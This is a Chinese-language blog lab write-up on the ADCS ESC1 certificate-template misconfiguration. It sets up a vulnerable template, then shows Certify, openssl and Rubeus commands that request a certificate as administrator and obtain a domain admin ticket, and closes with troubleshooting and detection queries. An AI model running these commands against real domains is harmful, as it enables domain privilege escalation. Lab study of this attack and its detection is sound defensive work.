<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="ESC1参考:ESC1 搭建:   角色 IP 系统信息    DC01 192.168.198.10 win2019x64-10.0.17763 暂缺 Build 17763   CA01 192.168.198.20 win2019x64-10.0.17763 暂缺 Build 17763   IT01 192.168.198.115 win10x64-10.0.18363 暂缺 Build">
<meta property="og:type" content="article">
<meta property="og:title" content="ADCS篇-ESC1">
<meta property="og:url" content="https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/index.html">
<meta property="og:site_name" content="3inter&#39;s Blog">
<meta property="og:description" content="ESC1参考:ESC1 搭建:   角色 IP 系统信息    DC01 192.168.198.10 win2019x64-10.0.17763 暂缺 Build 17763   CA01 192.168.198.20 win2019x64-10.0.17763 暂缺 Build 17763   IT01 192.168.198.115 win10x64-10.0.18363 暂缺 Build">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://3inter.net/assets/image-20230216113227-ugw705l.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216113310-cifb14h.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216113613-h9gaz6m.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216113643-7q87w7i.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216113706-vz0vmiz.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216113735-g51uy8t.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216113807-uifx6x5.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216114406-f1psou9.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216114420-ie91okf.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216114444-y5vvzcm.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216114514-mcly1z8.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216114535-1vqvve6.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216114643-km5twl1.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216114730-26yup2f.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216114750-lvbrzuk.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216114813-gxa6pka.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216114826-0dtd53c.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216114851-stmnrk7.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216114905-q22bbqm.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216114921-dy0tvzn.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216114944-5hdiusr.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216115000-w8d6dwi.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216115134-b5xllv7.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216115728-1l9bn86.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216115955-1z7jwlf.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216120036-ngtm756.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216121605-bo9n86g.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216120141-qzpwx89.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216120403-yydlzk7.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216120531-49p3abs.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216120549-csqojkm.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216120616-p2m5vzp.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216125814-xpb9ukm.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216130039-tp464nw.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216132352-iq3k3v0.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216132705-2kfit5q.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216133136-e15cmyq.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216133248-7tlw0to.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216130009-7xzs8ki.png">
<meta property="og:image" content="https://3inter.net/assets/1676460305771-20230215192519-gdq88ve.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216144932-paagodv.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216145044-muavx04.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216145137-s4ugufz.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216145242-ikr4wmm.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216134434-0dmok8n.png">
<meta property="og:image" content="https://3inter.net/assets/image-20230216134700-48g3npv.png">
<meta property="article:published_time" content="2025-09-25T06:58:51.000Z">
<meta property="article:modified_time" content="2025-09-25T07:03:39.389Z">
<meta property="article:author" content="3inter">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://3inter.net/assets/image-20230216113227-ugw705l.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>ADCS篇-ESC1</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/lib/meslo-LG/styles.css">

    
<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">

    
<link rel="stylesheet" href="/css/style.css">

    <!-- rss -->
    
    
    <!-- jquery -->
    
<script src="/lib/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
    <div class="banner">
<div id="blogtitel" class="blogtitel">3inter&#39;s Blog</div>
<ul id="wrapper" class="wrapper">
  <div class="sun">
    <div class="star"></div>
  </div>
  <div class="mercury">
    <div class="planet">
      <div class="shadow"></div>
    </div>
  </div>
  <div class="venus">
    <div class="planet">
      <div class="shadow"></div>
    </div>
  </div>
  <div class="earth">
    <div class="planet"><div class="shadow"></div></div>
  </div>
  <div class="mars">
    <div class="planet"><div class="shadow"></div></div>
  </div>
  <div class="jupiter">
    <div class="planet"><div class="shadow"></div></div>
  </div>
</ul>
</div>

    <div class="background">
      
        <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/home/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2025/09/28/ProxyToken-Gaget-to-RCE/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
        
        
        <li><a class="icon" href="/2025/09/22/%E4%BA%91%E5%87%BD%E6%95%B0%E4%B9%8B%E8%85%BE%E8%AE%AF%E4%BA%91/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/&text=ADCS篇-ESC1"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/&title=ADCS篇-ESC1"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/&is_video=false&description=ADCS篇-ESC1"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ADCS篇-ESC1&body=Check out this article: https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/&title=ADCS篇-ESC1"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/&title=ADCS篇-ESC1"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/&title=ADCS篇-ESC1"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/&title=ADCS篇-ESC1"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/&name=ADCS篇-ESC1&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ESC1"><span class="toc-number">1.</span> <span class="toc-text">ESC1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.1.</span> <span class="toc-text">参考:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">搭建:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">利用:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%91%E7%82%B9%E4%B8%80"><span class="toc-number">1.3.1.</span> <span class="toc-text">坑点一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%91%E7%82%B9%E4%BA%8C"><span class="toc-number">1.3.2.</span> <span class="toc-text">坑点二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%91%E7%82%B9%E4%B8%89"><span class="toc-number">1.3.3.</span> <span class="toc-text">坑点三</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95"><span class="toc-number">1.4.</span> <span class="toc-text">检测方法:</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

      
      <div class="content index width mx-auto px2 my4">
          
          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        ADCS篇-ESC1
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">3inter's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2025-09-25T06:58:51.000Z" itemprop="datePublished">2025-09-25</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="ESC1"><a href="#ESC1" class="headerlink" title="ESC1"></a>ESC1</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p><a target="_blank" rel="noopener" href="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse/esc1" title="利用">ESC1</a></p>
<h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建:"></a>搭建:</h2><table>
<thead>
<tr>
<th>角色</th>
<th>IP</th>
<th>系统信息</th>
</tr>
</thead>
<tbody><tr>
<td>DC01</td>
<td>192.168.198.10</td>
<td>win2019x64-10.0.17763 暂缺 Build 17763</td>
</tr>
<tr>
<td>CA01</td>
<td>192.168.198.20</td>
<td>win2019x64-10.0.17763 暂缺 Build 17763</td>
</tr>
<tr>
<td>IT01</td>
<td>192.168.198.115</td>
<td>win10x64-10.0.18363 暂缺 Build 18363</td>
</tr>
</tbody></table>
<ol>
<li><p>搭建 dc 中规中矩 略</p>
</li>
<li><p>搭建域内工作机器 略</p>
</li>
<li><p>搭建配置不当 ESC1 环境</p>
<p><img src="/assets/image-20230216113227-ugw705l.png" alt="image"></p>
<p><img src="/assets/image-20230216113310-cifb14h.png" alt="image"></p>
<p><img src="/assets/image-20230216113613-h9gaz6m.png" alt="image"></p>
<p><img src="/assets/image-20230216113643-7q87w7i.png" alt="image"></p>
<p><img src="/assets/image-20230216113706-vz0vmiz.png" alt="image"></p>
<p><img src="/assets/image-20230216113735-g51uy8t.png" alt="image"></p>
<p><img src="/assets/image-20230216113807-uifx6x5.png" alt="image"></p>
<p><img src="/assets/image-20230216114406-f1psou9.png" alt="image"></p>
<p><img src="/assets/image-20230216114420-ie91okf.png" alt="image"></p>
<p><img src="/assets/image-20230216114444-y5vvzcm.png" alt="image"></p>
<p><img src="/assets/image-20230216114514-mcly1z8.png" alt="image"></p>
<p><img src="/assets/image-20230216114535-1vqvve6.png" alt="image"></p>
<p><img src="/assets/image-20230216114643-km5twl1.png" alt="image"></p>
<p><img src="/assets/image-20230216114730-26yup2f.png" alt="image"></p>
<p><img src="/assets/image-20230216114750-lvbrzuk.png" alt="image"></p>
<p><img src="/assets/image-20230216114813-gxa6pka.png" alt="image"></p>
<p><img src="/assets/image-20230216114826-0dtd53c.png" alt="image"></p>
<p><img src="/assets/image-20230216114851-stmnrk7.png" alt="image"></p>
<p><img src="/assets/image-20230216114905-q22bbqm.png" alt="image"></p>
<p><img src="/assets/image-20230216114921-dy0tvzn.png" alt="image"></p>
<p><img src="/assets/image-20230216114944-5hdiusr.png" alt="image"></p>
<p><img src="/assets/image-20230216115000-w8d6dwi.png" alt="image"></p>
<p><img src="/assets/image-20230216115134-b5xllv7.png" alt="image"></p>
<p>打开 mmc 添加&#x2F;删除管理单元</p>
<p><img src="/assets/image-20230216115728-1l9bn86.png" alt="image"></p>
<p>添加证书模板 和 证书颁发机构</p>
<p><img src="/assets/image-20230216115955-1z7jwlf.png" alt="image"></p>
<p>复制工作站身份认证模板</p>
<p><img src="/assets/image-20230216120036-ngtm756.png" alt="image"></p>
<p>配置模板</p>
<p>修改模板名为 ESC1</p>
<p><img src="/assets/image-20230216121605-bo9n86g.png" alt="image"></p>
<p><img src="/assets/image-20230216120141-qzpwx89.png" alt="image"></p>
<p>扩展–&gt; 应用程序策略 –&gt; 加入客户端身份认证</p>
<p><img src="/assets/image-20230216120403-yydlzk7.png" alt="image"></p>
<p>安全 –&gt; 高级添加 domain users 权限</p>
<p><img src="/assets/image-20230216120531-49p3abs.png" alt="image"></p>
<p><img src="/assets/image-20230216120549-csqojkm.png" alt="image"></p>
<p><img src="/assets/image-20230216120616-p2m5vzp.png" alt="image"></p>
<p><img src="/assets/image-20230216125814-xpb9ukm.png" alt="image"></p>
<p>至此配置模板结束，此时使用工具检测，会出现如下错误，细节参阅<strong>坑点一</strong></p>
<blockquote>
<p>[!] Vulnerable certificate templates that exist but an Enterprise CA does not publish</p>
</blockquote>
<p>配置结束后</p>
<p><img src="/assets/image-20230216130039-tp464nw.png" alt="image"></p>
</li>
</ol>
<p>‍</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用:"></a>利用:</h2><p><strong>工具</strong>:</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rubeus</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Certify">Certify</a></li>
</ol>
<blockquote>
<p>通过 Certify 申请证书</p>
</blockquote>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">Certify<span class="token punctuation">.</span>exe request <span class="token operator">/</span>ca:CA01<span class="token punctuation">.</span>adsec<span class="token punctuation">.</span>com\adsec-CA01-CA <span class="token operator">/</span>template:ESC1 <span class="token operator">/</span>altname:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/assets/image-20230216132352-iq3k3v0.png" alt="image"></p>
<p>将结果保存为 cert.pem</p>
<blockquote>
<p>上条命令结尾已经给出下一步</p>
</blockquote>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">openssl pkcs12 <span class="token operator">-in</span> cert<span class="token punctuation">.</span>pem <span class="token operator">-</span>keyex <span class="token operator">-</span>CSP <span class="token string">"Microsoft Enhanced Cryptographic Provider v1.0"</span> <span class="token operator">-</span>export <span class="token operator">-</span>out cert<span class="token punctuation">.</span>pfx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/assets/image-20230216132705-2kfit5q.png" alt="image"></p>
<p>不输入密码直接回车，生成 cert.pfx</p>
<blockquote>
<p>使用 Rubeus 获取 TGT</p>
</blockquote>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">Rubeus<span class="token punctuation">.</span>exe asktgt <span class="token operator">/</span>user:administrator <span class="token operator">/</span>certificate:cert<span class="token punctuation">.</span>pfx <span class="token operator">/</span>dc:dc01<span class="token punctuation">.</span>adsec<span class="token punctuation">.</span>com <span class="token operator">/</span>ptt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/assets/image-20230216133136-e15cmyq.png" alt="image"></p>
<p>利用结束:</p>
<p><img src="/assets/image-20230216133248-7tlw0to.png" alt="image"></p>
<h3 id="坑点一"><a href="#坑点一" class="headerlink" title="坑点一"></a>坑点一</h3><blockquote>
<p>未发布证书导致错误：</p>
<p>[!] Vulnerable certificate templates that exist but an Enterprise CA does not publish</p>
</blockquote>
<p>错误如图所示:</p>
<p><img src="/assets/image-20230216130009-7xzs8ki.png" alt="image"></p>
<p>解决办法：</p>
<ol>
<li><p>打开服务管理器 -&gt; 证书服务器右键 -&gt; 证书颁发机构 -&gt; 选择证书模板 新建选择刚才配置好的模板</p>
<p><img src="/assets/1676460305771-20230215192519-gdq88ve.png" alt="1676460305771"></p>
<p><span data-type="text" id="" style="color: var(--b3-font-color8);">致谢</span>:<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1583">略略略</a></p>
</li>
</ol>
<h3 id="坑点二"><a href="#坑点二" class="headerlink" title="坑点二"></a>坑点二</h3><blockquote>
<p>在 Rubeus 使用过程中 可能存在:KDC_ERR_CLIENT_NOT_TRUSTED</p>
</blockquote>
<p>引用：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768">官方说明</a></p>
<p>?可能原因(未找到文档说明，但是有效此次实验表现):域内时间不同步。</p>
<p>解决方法:</p>
<p>致谢:<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_14907428/3881727">自在拉基</a></p>
<p><img src="/assets/image-20230216144932-paagodv.png" alt="image"></p>
<p><img src="/assets/image-20230216145044-muavx04.png" alt="image"></p>
<p><img src="/assets/image-20230216145137-s4ugufz.png" alt="image"></p>
<blockquote>
<p>刷新组策略</p>
</blockquote>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">gpupdate <span class="token operator">/</span>force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/assets/image-20230216145242-ikr4wmm.png" alt="image"></p>
<blockquote>
<p>回到域内机器，进行时间同步</p>
</blockquote>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">w32tm <span class="token operator">/</span>resync <span class="token operator">/</span>computer:dc01<span class="token punctuation">.</span>adsec<span class="token punctuation">.</span>com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="坑点三"><a href="#坑点三" class="headerlink" title="坑点三"></a>坑点三</h3><blockquote>
<p>在 Rubeus 使用过程中,KDC_ERR_PADATA_TYPE_NOSUPP</p>
</blockquote>
<p>引用：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768">官方说明</a></p>
<p>解决方法:</p>
<p>在 dc 打开组策略</p>
<p><img src="/assets/image-20230216134434-0dmok8n.png" alt="image"></p>
<p><img src="/assets/image-20230216134700-48g3npv.png" alt="image"></p>
<p>‍</p>
<p>‍</p>
<h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法:"></a>检测方法:</h2><p>Tip: OID 1.2.840.113556.1.4.804 （允许位运算）</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Get-ADObject</span> <span class="token operator">-</span>LDAPFilter <span class="token string">'(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))'</span> <span class="token operator">-</span>SearchBase <span class="token string">'CN=Configuration,DC=adsec,DC=local'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>‍</p>
<p>‍</p>
<p>CertEntryId &#x3D; EntryId 则符合条件，不考虑权限，满足ESC1 条件。</p>
<p>查询解析出来的安全描述符 业务表</p>
<p>对于证书模板，模板的 DACL 中的以下 ACE 可能会导致主体具有注册权限：</p>
<ul>
<li>ACE 为主体授予证书注册（Certificate-Enrollment）扩展权限。这个 ACE 授予主体 <code>RIGHT_DS_CONTROL_ACCESS</code>​​ 访问权限，其中 <code>ObjectType</code>​​ 设置为 <code>0e10c968-78fb-11d2-90d4-00c04f79dc5547</code>。此 GUID 对应于 Certificate-Enrollment 权限。</li>
<li>ACE 为主体授予证书自动注册 （Certificate-AutoEnrollment）扩展权限。这个 ACE 授予主体 <code>RIGHT_DS_CONTROL_ACCESS</code>​​ 访问权限，其中 <code>ObjectType</code>​​ 设置为 <code>a05b8cc2-17bc-4802-a710-e7c15ab866a249</code>。此 GUID 对应于 Certificate-AutoEnrollment 扩展权限。</li>
<li>ACE 为主体授予所有扩展（ExtendedRights）权限。这个 ACE 启⽤ <code>RIGHT_DS_CONTROL_ACCESS</code>​​ 访问权限，其中 <code>ObjectType</code>​​ 设置为 <code>00000000- 0000-0000-0000-000000000000</code>。此 GUID 对应于 ExtendedRights 权限。</li>
<li>ACE 为主体授予完全控制（FullControl&#x2F;GenericAll）权限。这个 ACE 启用 FullControl&#x2F;GenericAll 访问权限。</li>
</ul>
<p>‍</p>
<p>‍</p>
<p>开启证书日志审计</p>
<blockquote>
<p>HKEY_CURRENT_USER\Software\Microsoft\Cryptography\Autoenrollment  AEEventLogLevel  0（用户自动注册）</p>
<p>HKEY_LOCAL_MACHINE\Software\Microsoft\Cryptography\Autoenrollment AEEventLogLevel  0（机器自动注册）</p>
</blockquote>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">reg add <span class="token string">"HKEY_CURRENT_USER\Software\Microsoft\Cryptography\Autoenrollment"</span> <span class="token operator">/</span>v AEEventLogLevel <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">reg add <span class="token string">"HKEY_LOCAL_MACHINE\Software\Microsoft\Cryptography\Autoenrollment"</span> <span class="token operator">/</span>v AEEventLogLevel <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>‍</p>

  </div>
</article>



      </div>
      
       <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/home/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ESC1"><span class="toc-number">1.</span> <span class="toc-text">ESC1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.1.</span> <span class="toc-text">参考:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.</span> <span class="toc-text">搭建:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">利用:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%91%E7%82%B9%E4%B8%80"><span class="toc-number">1.3.1.</span> <span class="toc-text">坑点一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%91%E7%82%B9%E4%BA%8C"><span class="toc-number">1.3.2.</span> <span class="toc-text">坑点二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9D%91%E7%82%B9%E4%B8%89"><span class="toc-number">1.3.3.</span> <span class="toc-text">坑点三</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95"><span class="toc-number">1.4.</span> <span class="toc-text">检测方法:</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/&text=ADCS篇-ESC1"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/&title=ADCS篇-ESC1"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/&is_video=false&description=ADCS篇-ESC1"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ADCS篇-ESC1&body=Check out this article: https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/&title=ADCS篇-ESC1"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/&title=ADCS篇-ESC1"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/&title=ADCS篇-ESC1"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/&title=ADCS篇-ESC1"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://3inter.net/2025/09/25/ADCS%E7%AF%87-ESC1/&name=ADCS篇-ESC1&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
